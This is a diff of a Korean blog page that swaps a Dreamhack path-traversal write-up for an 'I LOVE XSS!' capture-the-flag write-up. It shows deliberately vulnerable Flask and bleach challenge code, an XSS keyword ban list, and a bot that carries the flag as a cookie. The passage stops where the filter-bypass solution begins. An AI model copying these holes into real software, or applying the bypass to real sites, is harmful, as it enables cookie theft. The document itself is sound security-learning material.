@@ -36,27 +36,27 @@
   
     <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.2" />
-<meta property="og:title" content="[Dreamhack] pathtraversal 해설" />
+<meta property="og:title" content="[Dreamhack] I LOVE XSS! 해설" />
 <meta name="author" content="박지율" />
 <meta property="og:locale" content="en" />
 <meta name="description" content="문제 특징" />
 <meta property="og:description" content="문제 특징" />
-<link rel="canonical" href="http://localhost:4000/posts/Dreamhack_pathtraversal/" />
-<meta property="og:url" content="http://localhost:4000/posts/Dreamhack_pathtraversal/" />
+<link rel="canonical" href="http://localhost:4000/posts/Dreamhack_I-LOVE-XSS!/" />
+<meta property="og:url" content="http://localhost:4000/posts/Dreamhack_I-LOVE-XSS!/" />
 <meta property="og:site_name" content="jyp_devlog" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2026-04-03T12:00:00+09:00" />
+<meta property="article:published_time" content="2026-06-09T12:00:02+09:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="[Dreamhack] pathtraversal 해설" />
+<meta property="twitter:title" content="[Dreamhack] I LOVE XSS! 해설" />
 <meta name="twitter:site" content="@twitter_username" />
 <meta name="twitter:creator" content="@박지율" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"박지율","url":"https://github.com/1221jyp"},"dateModified":"2026-04-03T14:25:02+09:00","datePublished":"2026-04-03T12:00:00+09:00","description":"문제 특징","headline":"[Dreamhack] pathtraversal 해설","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Dreamhack_pathtraversal/"},"url":"http://localhost:4000/posts/Dreamhack_pathtraversal/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"박지율","url":"https://github.com/1221jyp"},"dateModified":"2026-06-09T12:00:02+09:00","datePublished":"2026-06-09T12:00:02+09:00","description":"문제 특징","headline":"[Dreamhack] I LOVE XSS! 해설","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Dreamhack_I-LOVE-XSS!/"},"url":"http://localhost:4000/posts/Dreamhack_I-LOVE-XSS!/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
 
-  <title>[Dreamhack] pathtraversal 해설 | jyp_devlog
+  <title>[Dreamhack] I LOVE XSS! 해설 | jyp_devlog
   </title>
 
   <!--
@@ -431,7 +431,7 @@
         
 
           
-            <span>[Dreamhack] pathtraversal 해설</span>
+            <span>[Dreamhack] I LOVE XSS! 해설</span>
           
 
         
@@ -508,6 +508,91 @@
 
 
 
+  
+  
+
+  <!-- CDN URL -->
+  
+
+  <!-- Add image path -->
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+      
+
+      
+
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+
+    
+
+    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
+    
+    
+
+    <!-- add image placeholder -->
+    
+      
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    <!-- make sure the `<img>` is wrapped by `<a>` -->
+    
+
+    
+      <!-- create the image wrapper -->
+      
+    
+
+    <!-- combine -->
+    
+
+  
+
+  
+
+
 
 <!-- Add header for code snippets -->
 
@@ -530,6 +615,54 @@
       
         
         
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
       
 
       
@@ -627,7 +760,7 @@
 
 <!-- return -->
 
-<h1 data-toc-skip>[Dreamhack] pathtraversal 해설</h1>
+<h1 data-toc-skip>[Dreamhack] I LOVE XSS! 해설</h1>
 
 <div class="post-meta text-muted">
   <!-- published date -->
@@ -642,34 +775,15 @@
 
 
 <em class=""
-    data-ts="1775185200"
+    data-ts="1780974002"
     data-df="ll"
     data-toggle="tooltip" data-placement="bottom">
-  Apr  3, 2026
+  Jun  9, 2026
 </em>
 
   </span>
 
   <!-- lastmod date -->
-  
-  <span>
-    Updated <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-
-<em class=""
-    data-ts="1775193902"
-    data-df="ll"
-    data-toggle="tooltip" data-placement="bottom">
-  Apr  3, 2026
-</em>
-
-  </span>
    
 
   <div class="d-flex justify-content-between">
@@ -710,8 +824,8 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="629 words">
-  <em>3 min</em> read</span>
+  title="1117 words">
+  <em>6 min</em> read</span>
 
     </div>
   </div>
@@ -722,11 +836,10 @@
 <div class="post-content"><h1 id="문제-특징">문제 특징</h1>
 
 <blockquote>
-  <p>Querystring과 request라이브러리를 이용한 해킹</p>
+  <p>XSS를 사용한 해킹 &amp; 금지 태그 우회</p>
 </blockquote>
 
-<h2 id="문제-이름-pathtraversal"><span class="mr-2"><strong>문제 이름</strong>: pathtraversal</span><a href="#문제-이름-pathtraversal" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<h2 id="난이도-lvbeginner"><span class="mr-2"><strong>난이도</strong>: Lv.Beginner</span><a href="#난이도-lvbeginner" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<h2 id="난이도-lv2"><span class="mr-2"><strong>난이도</strong>: Lv.2</span><a href="#난이도-lv2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 <h2 id="카테고리-웹해킹"><span class="mr-2"><strong>카테고리</strong>: 웹해킹</span><a href="#카테고리-웹해킹" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
 <hr />
@@ -739,8 +852,14 @@
         <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
+3
+4
+5
 </pre></td><td class="rouge-code"><pre>/
-└── app.py
+├── app.py
+├── Dockerfile
+├── requirements.txt
+└── sanitizer.py
 </pre></td></tr></tbody></table></code></div></div>
 
 <h2 id="주요-코드"><span class="mr-2">주요 코드</span><a href="#주요-코드" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
@@ -807,100 +926,67 @@
 58
 59
 60
-61
-62
-63
-64
-65
-66
-67
-68
-69
-70
-71
-72
-73
 </pre></td><td class="rouge-code"><pre>
-<span class="c1">#!/usr/bin/python3
-</span><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">abort</span>
-<span class="kn">from</span> <span class="n">functools</span> <span class="kn">import</span> <span class="n">wraps</span>
-<span class="kn">import</span> <span class="n">requests</span>
-<span class="kn">import</span> <span class="n">os</span><span class="p">,</span> <span class="n">json</span>
+<span class="c1">#app.py
+</span>
+<span class="n">banlist</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">`</span><span class="sh">"</span><span class="p">,</span><span class="sh">"'"</span><span class="p">,</span><span class="sh">"</span><span class="s">alert(</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">fetch(</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">replace(</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">[</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">]</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">javascript</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">@</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">!</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">%</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">location</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">href</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">window</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">eval</span><span class="sh">"</span><span class="p">]</span>
 
-<span class="n">users</span> <span class="o">=</span> <span class="p">{</span>
-    <span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">:</span> <span class="p">{</span>
-        <span class="sh">'</span><span class="s">userid</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">guest</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sh">'</span><span class="s">level</span><span class="sh">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
-        <span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">guest</span><span class="sh">'</span>
-    <span class="p">},</span>
-    <span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">:</span> <span class="p">{</span>
-        <span class="sh">'</span><span class="s">userid</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">,</span>
-        <span class="sh">'</span><span class="s">level</span><span class="sh">'</span><span class="p">:</span> <span class="mi">9999</span><span class="p">,</span>
-        <span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span>
-    <span class="p">}</span>
-<span class="p">}</span>
 
-<span class="k">def</span> <span class="nf">internal_api</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
-    <span class="nd">@wraps</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>
-    <span class="k">def</span> <span class="nf">decorated_view</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
-        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">remote_addr</span> <span class="o">==</span> <span class="sh">'</span><span class="s">127.0.0.1</span><span class="sh">'</span><span class="p">:</span>
-            <span class="k">return</span> <span class="nf">func</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
-        <span class="k">else</span><span class="p">:</span>
-            <span class="nf">abort</span><span class="p">(</span><span class="mi">401</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">decorated_view</span>
-
-<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
-<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
-<span class="n">API_HOST</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://127.0.0.1:8000</span><span class="sh">'</span>
-
-<span class="k">try</span><span class="p">:</span>
-    <span class="n">FLAG</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./flag.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="c1"># Flag is here!!
-</span><span class="k">except</span><span class="p">:</span>
-    <span class="n">FLAG</span> <span class="o">=</span> <span class="sh">'</span><span class="s">[**FLAG**]</span><span class="sh">'</span>
+<span class="k">def</span> <span class="nf">read_url</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">driver</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">service</span> <span class="o">=</span> <span class="nc">Service</span><span class="p">(</span><span class="n">executable_path</span><span class="o">=</span><span class="sh">"</span><span class="s">/usr/local/bin/chromedriver</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">options</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">ChromeOptions</span><span class="p">()</span>
+        <span class="k">for</span> <span class="n">opt</span> <span class="ow">in</span> <span class="p">[</span>
+            <span class="sh">"</span><span class="s">headless</span><span class="sh">"</span><span class="p">,</span>
+            <span class="sh">"</span><span class="s">window-size=1920x1080</span><span class="sh">"</span><span class="p">,</span>
+            <span class="sh">"</span><span class="s">disable-gpu</span><span class="sh">"</span><span class="p">,</span>
+            <span class="sh">"</span><span class="s">no-sandbox</span><span class="sh">"</span><span class="p">,</span>
+            <span class="sh">"</span><span class="s">disable-dev-shm-usage</span><span class="sh">"</span><span class="p">,</span>
+        <span class="p">]:</span>
+            <span class="n">options</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="n">opt</span><span class="p">)</span>
+        <span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">Chrome</span><span class="p">(</span><span class="n">service</span><span class="o">=</span><span class="n">service</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="n">options</span><span class="p">)</span>
+        <span class="n">driver</span><span class="p">.</span><span class="nf">implicitly_wait</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+        <span class="n">driver</span><span class="p">.</span><span class="nf">set_page_load_timeout</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+        <span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://127.0.0.1:5000/</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">driver</span><span class="p">.</span><span class="nf">add_cookie</span><span class="p">({</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">flag</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">:</span><span class="n">FLAG</span><span class="p">,</span> <span class="sh">'</span><span class="s">domain</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">127.0.0.1</span><span class="sh">'</span><span class="p">})</span>
+        <span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+        <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">driver</span><span class="p">:</span>
+            <span class="n">driver</span><span class="p">.</span><span class="nf">quit</span><span class="p">()</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="k">if</span> <span class="n">driver</span><span class="p">:</span>
+        <span class="n">driver</span><span class="p">.</span><span class="nf">quit</span><span class="p">()</span>
+    <span class="k">return</span> <span class="bp">True</span>
 
 <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
-<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
-    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
+    <span class="k">return</span> <span class="sh">"</span><span class="s">I LOVE XSS!</span><span class="sh">"</span>
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/get_info</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
-<span class="k">def</span> <span class="nf">get_info</span><span class="p">():</span>
-    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">get_info.html</span><span class="sh">'</span><span class="p">)</span>
-    <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
-        <span class="n">userid</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">userid</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
-        <span class="n">info</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">API_HOST</span><span class="si">}</span><span class="s">/api/user/</span><span class="si">{</span><span class="n">userid</span><span class="si">}</span><span class="sh">'</span><span class="p">).</span><span class="n">text</span>
-        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">get_info.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">info</span><span class="o">=</span><span class="n">info</span><span class="p">)</span>
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/test</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">test</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">payload</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">payload</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">return</span> <span class="sh">"</span><span class="s">show your payload!</span><span class="sh">"</span>
+    
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">lower</span><span class="p">()</span>
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/api</span><span class="sh">'</span><span class="p">)</span>
-<span class="nd">@internal_api</span>
-<span class="k">def</span> <span class="nf">api</span><span class="p">():</span>
-    <span class="k">return</span> <span class="sh">'</span><span class="s">/user/&lt;uid&gt;, /flag</span><span class="sh">'</span>
+    <span class="k">if</span> <span class="nf">any</span><span class="p">(</span><span class="n">banned</span> <span class="ow">in</span> <span class="n">payload</span> <span class="k">for</span> <span class="n">banned</span> <span class="ow">in</span> <span class="n">banlist</span><span class="p">):</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Nope!</span><span class="sh">"</span>
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/api/user/&lt;uid&gt;</span><span class="sh">'</span><span class="p">)</span>
-<span class="nd">@internal_api</span>
-<span class="k">def</span> <span class="nf">get_flag</span><span class="p">(</span><span class="n">uid</span><span class="p">):</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">info</span> <span class="o">=</span> <span class="n">users</span><span class="p">[</span><span class="n">uid</span><span class="p">]</span>
-    <span class="k">except</span><span class="p">:</span>
-        <span class="n">info</span> <span class="o">=</span> <span class="p">{}</span>
-    <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">info</span><span class="p">)</span>
+    <span class="nb">input</span> <span class="o">=</span> <span class="nf">sanitize_input</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/api/flag</span><span class="sh">'</span><span class="p">)</span>
-<span class="nd">@internal_api</span>
-<span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
-    <span class="k">return</span> <span class="n">FLAG</span>
+    <span class="k">return</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="nb">input</span><span class="si">}</span><span class="sh">"</span>
 
-<span class="n">application</span> <span class="o">=</span> <span class="n">app</span> <span class="c1">#app.run(host='0.0.0.0', port=8000)
-# Dockerfile
-#     ENTRYPOINT ["uwsgi", "--socket", "0.0.0.0:8000", "--protocol=http", "--threads", "4", "--wsgi-file", "app.py"]
-</span></pre></td></tr></tbody></table></code></div></div>
-<p>이 문제의 파일에서는 <code class="language-plaintext highlighter-rouge">html</code> 파일을 제공하지 않는다.</p>
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/flag</span><span class="sh">'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">report</span><span class="p">():</span>
+    <span class="n">uanswer</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">answer</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="nf">read_url</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">http://127.0.0.1:5000/test?payload=</span><span class="si">{</span><span class="n">uanswer</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">message</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Success</span><span class="sh">"</span> <span class="k">if</span> <span class="n">result</span> <span class="k">else</span> <span class="sh">"</span><span class="s">Fail</span><span class="sh">"</span>
+    <span class="k">return</span> <span class="n">message</span>
 
-<p><code class="language-plaintext highlighter-rouge">/api/flag</code>에 플래그 키가 존재하나, <code class="language-plaintext highlighter-rouge">@internal_api</code> 함수에 의해 로컬 환경에서만 접속이 가능하도록 제한이 되어 있어 단순히 <code class="language-plaintext highlighter-rouge">/api/flag</code> 주소로 접속하여 플래그를 얻어낼 수 없다.</p>
-
-<h1 id="풀이">풀이</h1>
-
-<h2 id="쿼리-스트링과-requestsget-함수-활용하기"><span class="mr-2">쿼리 스트링과 requests.get() 함수 활용하기</span><a href="#쿼리-스트링과-requestsget-함수-활용하기" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+</pre></td></tr></tbody></table></code></div></div>
 
 <div class="language-python highlighter-rouge"><div class="code-header">
         <span data-label-text="Python"><i class="fas fa-code small"></i></span>
@@ -912,20 +998,44 @@
 6
 7
 8
-</pre></td><td class="rouge-code"><pre><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/get_info</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
-<span class="k">def</span> <span class="nf">get_info</span><span class="p">():</span>
-    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">get_info.html</span><span class="sh">'</span><span class="p">)</span>
-    <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
-        <span class="n">userid</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">userid</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
-        <span class="n">info</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">API_HOST</span><span class="si">}</span><span class="s">/api/user/</span><span class="si">{</span><span class="n">userid</span><span class="si">}</span><span class="sh">'</span><span class="p">).</span><span class="n">text</span>
-        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">get_info.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">info</span><span class="o">=</span><span class="n">info</span><span class="p">)</span>
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre><span class="c1"># sanitizer.py
+</span><span class="kn">import</span> <span class="n">bleach</span>
+
+<span class="n">ALLOWED_TAGS</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">script</span><span class="sh">'</span><span class="p">]</span>   <span class="c1">#I only love script tags!
+</span><span class="n">ALLOWED_ATTRIBUTES</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="n">ALLOWED_PROTOCOLS</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">sanitize_input</span><span class="p">(</span><span class="n">user_input</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="k">return</span> <span class="n">bleach</span><span class="p">.</span><span class="nf">clean</span><span class="p">(</span>
+        <span class="n">user_input</span><span class="p">,</span>
+        <span class="n">tags</span><span class="o">=</span><span class="n">ALLOWED_TAGS</span><span class="p">,</span>
+        <span class="n">attributes</span><span class="o">=</span><span class="n">ALLOWED_ATTRIBUTES</span><span class="p">,</span>
+        <span class="n">protocols</span><span class="o">=</span><span class="n">ALLOWED_PROTOCOLS</span><span class="p">,</span>
+        <span class="n">strip</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
+        <span class="n">strip_comments</span><span class="o">=</span><span class="bp">True</span>
+    <span class="p">)</span>
 </pre></td></tr></tbody></table></code></div></div>
-<p><code class="language-plaintext highlighter-rouge">/get_info</code>주소에 <code class="language-plaintext highlighter-rouge">POST</code>요청을 보냈을때, <code class="language-plaintext highlighter-rouge">userid</code>라는 파라미터의 값을 입력할 수 있다.
-<code class="language-plaintext highlighter-rouge">userid</code>파라미터는 <code class="language-plaintext highlighter-rouge">info</code>라는 변수에서 사용되는데, 이 변수는 <code class="language-plaintext highlighter-rouge">request.get()</code> 함수를 통해 <code class="language-plaintext highlighter-rouge">/api/user/{userid}</code> 주소에 <code class="language-plaintext highlighter-rouge">get</code>요청을 보낼수 있으므로, <code class="language-plaintext highlighter-rouge">userid</code>파라미터에 리소스 경로를 입력하면 <code class="language-plaintext highlighter-rouge">/api/flag</code>에도 접속이 가능할 것이다.</p>
 
-<p><code class="language-plaintext highlighter-rouge">POST</code>요청을 통해서만 해당 과정이 이루어지므로, 파이썬 파일을 하나 생성하여 <code class="language-plaintext highlighter-rouge">POST</code>요청을 보내보자.</p>
+<p>이 문제는 <a href="https://1221jyp.com/posts/Dreamhack_Xss-2/">XSS-2</a>,<a href="https://1221jyp.com/posts/Dreamhack_XSS-Filtering-Bypass/">XSS_Filtering_Bypass</a>문제와 매우 유사한 문제이고, <a href="https://1221jyp.com/posts/Dreamhack_XSS-Filtering-Bypass/">XSS_Filtering_Bypass</a> 문제보다 더 다양한 필터가 존재하는것을 확인할 수 있다.</p>
 
+<p>또한 이전 문제와는 달리 메모가 존재하지 않아, 다른 방식을 활용해 플래그를 탈취해야 한다.</p>
+
+<p>그리고 <code class="language-plaintext highlighter-rouge">bleach</code> 라이브러리를 사용하여 <code class="language-plaintext highlighter-rouge">sanitize_input()</code>이라는 함수를 만들고 
+<code class="language-plaintext highlighter-rouge">input = sanitize_input(payload)</code>이 작성되어 XSS 스크립트를 오로지 <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code>태그만을 사용하여 문제를 풀도록 되어있다.</p>
+
+<p><code class="language-plaintext highlighter-rouge">XSS</code>가 무엇인지 궁금하다면 <a href="https://1221jyp.com/posts/Dreamhack_Xss-2/" class="popup img-link "><img data-src="https://1221jyp.com/posts/Dreamhack_Xss-2/" alt="XSS-2" class="lazyload" data-proofer-ignore></a>문제를 먼저 확인하자.</p>
+
+<h1 id="풀이">풀이</h1>
+
+<h2 id="필터에-작성되어있는-특정-문자들을-사용하지-않고-페이로드-작성하기"><span class="mr-2">필터에 작성되어있는 특정 문자들을 사용하지 않고 페이로드 작성하기</span><a href="#필터에-작성되어있는-특정-문자들을-사용하지-않고-페이로드-작성하기" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 <div class="language-python highlighter-rouge"><div class="code-header">
         <span data-label-text="Python"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
@@ -933,30 +1043,99 @@
 3
 4
 5
-</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td><td class="rouge-code"><pre><span class="n">banlist</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">`</span><span class="sh">"</span><span class="p">,</span><span class="sh">"'"</span><span class="p">,</span><span class="sh">"</span><span class="s">alert(</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">fetch(</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">replace(</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">[</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">]</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">javascript</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">@</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">!</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">%</span><span class="sh">"</span><span class="p">,</span><span 